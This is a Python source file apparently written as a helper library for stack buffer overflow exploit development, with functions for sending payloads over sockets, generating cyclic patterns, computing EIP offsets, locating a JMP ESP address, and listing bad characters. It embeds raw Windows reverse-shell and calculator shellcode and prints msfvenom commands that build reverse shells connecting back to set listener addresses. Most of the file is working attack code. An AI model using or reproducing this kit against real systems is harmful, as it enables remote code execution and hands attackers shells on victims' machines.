import os
import struct
os.system('color')
import time


class JihadLibrary(object):
    def ip(self):
        return input(colors.BOLD +"What is the ip address(127.1.0.1): " + colors.END) or "127.1.0.1"
    def port(self):
        return int(input(colors.BOLD +"What is the the port(9999) : " + colors.END) or "9999")

    def copyRight(self):
        print(colors.HEADER + """"
            ____   __ __       ____  ____  __ __   ____  ___          ___  _           _____  ____  __ __    ___  ___   
            |    \ |  |  |     |    ||    ||  |  | /    ||   \        /  _]| |         / ___/ /    ||  |  |  /  _]|   \  
            |  o  )|  |  |     |__  | |  | |  |  ||  o  ||    \      /  [_ | |        (   \_ |  o  ||  |  | /  [_ |    \ 
            |     ||  ~  |     __|  | |  | |  _  ||     ||  D  |    |    _]| |___      \__  ||     ||  ~  ||    _]|  D  |
            |  O  ||___, |    /  |  | |  | |  |  ||  _  ||     |    |   [_ |     |     /  \ ||  _  ||___, ||   [_ |     |
            |     ||     |    \  `  | |  | |  |  ||  |  ||     |    |     ||     |     \    ||  |  ||     ||     ||     |
            |_____||____/      \____||____||__|__||__|__||_____|    |_____||_____|      \___||__|__||____/ |_____||_____|
            look at www.neetechs.com for more script
            """ + colors.END)
    def connectToSocket(self,socket, ip, port, s=None):
        if s is None:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            s = s
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #s.send(bytes(buffer + b"\r\n", "latin-1"))
        s.connect((ip, port))
        #s.bind((ip, port))
        print(colors.OkGreen + ip + ":" + str(port) + " has been connected" + colors.END)
        return s
    
    def receiveFromSocket(self,s):
        import time
        print(colors.WARNING + "Received: " + colors.END)
        s.setblocking(1)	
        data = s.recv(1024)
        data = data.decode()
        print(f"{colors.OkCyan}       {data} {colors.END}")
        time.sleep(0.5)
        

    def sendToSocket(self,s,message):
        #s.send(message)
        isString = isinstance(message, str)
        if isString:
            print("converting payload to binary")
            s.sendall(message.encode('ascii') )
            print(colors.OkGreen + "This message:" + message + "\n has been send successfully" + colors.END)

        else:
            print("binary payload has been send")
            s.send(message)

        #s.sendall(message)
    # Create Pattern
    def createPattern(self,length):
        from string import ascii_uppercase, ascii_lowercase, digits

        pattern = ""
        for upper in ascii_uppercase:
            for lower in ascii_lowercase:
                for digit in digits:
                    if len(pattern) < length:
                        pattern += upper + lower + digit

                    else:
                        out = pattern[:length]
                        return out

        # If we end up here we've exhausted all characters so truncate the pattern
        #return pattern[:length]
        return pattern
    
    def randomCharacters(self,y):
        import random
        import string
        return ''.join(random.choice(string.ascii_letters) for x in range(y))
    # Offset Pattern
    def offsetPattern(self, payload, totalCharacter):
        from string import ascii_uppercase, ascii_lowercase, digits

        #IP = input("enter the EIP(0x1234567A): ") or "0x31704330"
        eIP = input("enter the EIP(1234567A): ") or "31704330"
        print(eIP)
        needle = eIP

        try:
            #if needle.startswith("0x"):
            if needle.startswith(""):
                # Strip off '0x', convert to ASCII and reverse
                needle = needle[2:]
                needle = bytearray.fromhex(needle).decode("ascii")
                needle = needle[::-1]
                #return needle
        except (ValueError, TypeError) as e:
            print(e)
            raise

        haystack = ""
        for upper in ascii_uppercase:
            for lower in ascii_lowercase:
                for digit in digits:
                    haystack += upper + lower + digit
                    found_at = haystack.find(needle)
                    if found_at > -1:
                        return found_at
    
    def generatePayload(self):
        # get input
        payload = "This should be the random characters"
        character = input("what is the character(random): ") or self.randomCharacters(1)
        totalCharacter = int(input("What is the number of character(9999) : ") or "9999")
        payload = (character * totalCharacter)
        
        return payload, totalCharacter
    def generateRandomPayload(self):
        # get input
        payload = "This should be the random characters"
        character = input("what is the character(random): ") or self.randomCharacters(1)
        totalCharacter = int(input("What is the number of character(9999) : ") or "9999")
        payload = JihadLibrary().createPattern(totalCharacter) 
        payload += "\r\n"
               
        return payload, totalCharacter

    def generateMessage(self,payload):
        payload = input(colors.WARNING + "What is your message(default:anonymessage): " + colors.END) or "anonymessage"
        return payload
    
    def addReverseShell(self, payload, reverseShell = None):
        addShell = input(colors.WARNING + "Do you want to add reverse shell(y or n)(default:n): " + colors.END) or "n"
        if addShell == "y":
            if reverseShell:
                pass
            else:
                payload = payload.encode('ascii')
                reverseShell = ""
                JMP_ESP = self.findJMP_ESP()
                
                space = b"\x90"*12
                enter = b'\r\n'
                payload += JMP_ESP # \xC3\x14\x04\x08 b"\xdf\x14\x50\x62" 
                payload += space
                selectedShell = input(colors.WARNING + """
    Select Shell type?\n
      [1] Generate Reverse Shell(beta).
      [2] Generate Calculator Shell.
                    """ + colors.END) or "1"
                if selectedShell == "1":
                    reverseShell = self.generateReverseShell()   
                elif selectedShell == "2":
                    reverseShell = self.generateCalculatorShell()   

                payload += reverseShell
                payload += enter
                
                print(bytes(payload))
        # future update in sha allah
        return payload
    
    def listeningToPort(self,s):
        # client example
        
        while True:
            time.sleep(5)
            data = s.recv(512)
            if data.lower() == 'q':
                s.close()
                break

            print("RECEIVED: %s" % data)
            data = input("SEND( TYPE q or Q to Quit):")
            s.send(data)
            if data.lower() == 'q':
                s.close()
                break
    def findJMP_ESP(self):
        import struct
        # !mona modules
        # 
        JMP_ESP = input(colors.WARNING + """
        Note: you can find the JMP_ESP through these step:
        1. find the file name for example essfunc.dll
        !mona modules
        2. search for the esp
        !mona find -s "\-xff\-xe4" -m essfunc.dll
        3. write the character in backward and add - for example 
        this 625014DF will become DF145062 with out -
        What is the esp:
        JMP_ESP
        
        """ + colors.END) or "BF160408"



        # use struct library to convert jpm_esp to binary
        JMP_ESP = bytearray.fromhex(JMP_ESP)
        print()
        return  JMP_ESP #+ b"\x90" * 32
    def generateReverseShell(self):
        # the shell
        buf =  b""
        buf += b"\xbe\xc5\xfe\xe3\x8c\xdb\xd0\xd9\x74\x24\xf4\x5f"
        buf += b"\x29\xc9\xb1\x59\x31\x77\x14\x83\xc7\x04\x03\x77"
        buf += b"\x10\x27\x0b\x1f\x64\x28\xf4\xe0\x75\x56\x7c\x05"
        buf += b"\x44\x44\x1a\x4d\xf5\x58\x68\x03\xf6\x13\x3c\xb0"
        buf += b"\x09\x94\x8b\x9e\x24\x25\x80\xad\x6e\xe8\x57\xfd"
        buf += b"\x53\x6b\x24\xfc\x87\x4b\x15\xcf\xd5\x8a\x52\x99"
        buf += b"\x90\x63\x0e\x91\x09\x6b\x24\xe7\x91\xdc\x3b\x38"
        buf += b"\x62\xa2\x43\x3d\xb5\x56\xf8\x3c\xe6\x1d\x48\x27"
        buf += b"\x8d\x79\x69\x07\x90\xaa\xec\x6e\xe6\x70\xa6\xfb"
        buf += b"\x33\x03\x09\x03\x3a\xc5\x5b\x3b\xfc\x26\x96\x17"
        buf += b"\xfe\x7f\x91\x87\x74\x8b\xe1\x3a\x8f\x48\x9b\xe0"
        buf += b"\x1a\x4e\x3b\x62\xbc\xaa\xbd\xa7\x5b\x39\xb1\x0c"
        buf += b"\x2f\x65\xd6\x93\xfc\x1e\xe2\x18\x03\xf0\x62\x5a"
        buf += b"\x20\xd4\x2f\x38\x49\x4d\x8a\xef\x76\x8d\x72\x4f"
        buf += b"\xd3\xc6\x91\x86\x63\x27\x6a\xa7\x39\xbf\xa6\x6a"
        buf += b"\xc2\x3f\xa1\xfd\xb1\x0d\x6e\x56\x5e\x3d\xe7\x70"
        buf += b"\x99\x34\xef\x82\x75\xfe\x60\x7d\x76\xfe\xa9\xba"
        buf += b"\x22\xae\xc1\x6b\x4b\x25\x12\x93\x9e\xd3\x18\x03"
        buf += b"\x2b\x2a\x01\x2c\x43\x2e\x39\xcc\xf5\xa7\xdf\xa0"
        buf += b"\xa5\xe7\x4f\x01\x16\x47\x20\xe9\x7c\x48\x1f\x09"
        buf += b"\x7f\x83\x08\xa0\x90\x7d\x60\x5d\x08\x24\xfa\xfc"
        buf += b"\xd5\xf3\x86\x3f\x5d\xf1\x77\xf1\x96\x70\x64\xe6"
        buf += b"\xc0\x7a\x74\xf7\x64\x7a\x1e\xf3\x2e\x2d\xb6\xf9"
        buf += b"\x17\x19\x19\x01\x72\x1a\x5e\xfd\x03\x2a\x14\xc8"
        buf += b"\x91\x12\x42\x35\x76\x92\x92\x63\x1c\x92\xfa\xd3"
        buf += b"\x44\xc1\x1f\x1c\x51\x76\x8c\x89\x5a\x2e\x60\x19"
        buf += b"\x33\xcc\x5f\x6d\x9c\x2f\x8a\xed\xdb\xcf\x48\xda"
        buf += b"\x43\xa7\xb2\x5a\x74\x37\xd9\x5a\x24\x5f\x16\x74"
        buf += b"\xcb\xaf\xd7\x5f\x84\xa7\x52\x0e\x66\x56\x62\x1b"
        buf += b"\x26\xc6\x63\xa8\xf3\xf9\x1e\xc1\x04\xfa\xde\xcb"
        buf += b"\x60\xfb\xde\xf3\x96\xc0\x08\xca\xec\x07\x89\x69"
        buf += b"\xfe\x32\xac\xd8\x95\x3c\xe2\x1b\xbc"
        return buf
    
    def generateCalculatorShell(self):
        shellcode =  b""
        shellcode += b"\x29\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0"
        shellcode += b"\x5e\x81\x76\x0e\xa4\xa7\x09\x4e\x83\xee\xfc"
        shellcode += b"\xe2\xf4\x58\x4f\x8b\x4e\xa4\xa7\x69\xc7\x41"
        shellcode += b"\x96\xc9\x2a\x2f\xf7\x39\xc5\xf6\xab\x82\x1c"
        shellcode += b"\xb0\x2c\x7b\x66\xab\x10\x43\x68\x95\x58\xa5"
        shellcode += b"\x72\xc5\xdb\x0b\x62\x84\x66\xc6\x43\xa5\x60"
        shellcode += b"\xeb\xbc\xf6\xf0\x82\x1c\xb4\x2c\x43\x72\x2f"
        shellcode += b"\xeb\x18\x36\x47\xef\x08\x9f\xf5\x2c\x50\x6e"
        shellcode += b"\xa5\x74\x82\x07\xbc\x44\x33\x07\x2f\x93\x82"
        shellcode += b"\x4f\x72\x96\xf6\xe2\x65\x68\x04\x4f\x63\x9f"
        shellcode += b"\xe9\x3b\x52\xa4\x74\xb6\x9f\xda\x2d\x3b\x40"
        shellcode += b"\xff\x82\x16\x80\xa6\xda\x28\x2f\xab\x42\xc5"
        shellcode += b"\xfc\xbb\x08\x9d\x2f\xa3\x82\x4f\x74\x2e\x4d"
        shellcode += b"\x6a\x80\xfc\x52\x2f\xfd\xfd\x58\xb1\x44\xf8"
        shellcode += b"\x56\x14\x2f\xb5\xe2\xc3\xf9\xcd\x08\xc3\x21"
        shellcode += b"\x15\x09\x4e\xa4\xf7\x61\x7f\x2f\xc8\x8e\xb1"
        shellcode += b"\x71\x1c\xe9\x53\x8e\xad\x61\xe8\x31\x1a\x94"
        shellcode += b"\xb1\x71\x9b\x0f\x32\xae\x27\xf2\xae\xd1\xa2"
        shellcode += b"\xb2\x09\xb7\xd5\x66\x24\xa4\xf4\xf6\x9b\xc7"
        shellcode += b"\xc6\x65\x2d\x8a\xc2\x71\x2b\xa4\xa7\x09\x4e"
        return shellcode
    
    def msfVenomCode():
        print("""
        open calculator:
            msfvenom -p windows/exec -b "\ x00" -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread
        reverse shell:
            msfvenom -p windows/shell_reverse_tcp LHOST=172.21.252.174 LPORT=7777 -b "\ x00" -f c
            msfvenom -p windows/shell_reverse_tcp LHOST=10.9.200.20 LPORT=7777 -e x86/shikata_ga_nai -f exe -b "\ x00\ xa" -f python -v payload

        """)
    def badChars():
        character = (
            b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
            b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
            b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
            b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
            b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
            b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
            b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
            b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
            b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
            b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
            b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
            b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
            b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
            b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
            b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
            b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
            )
        return character
class colors:
    HEADER = '\033[95m'
    OkBlue = '\033[94m'
    OkCyan = '\033[96m'
    OkGreen = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
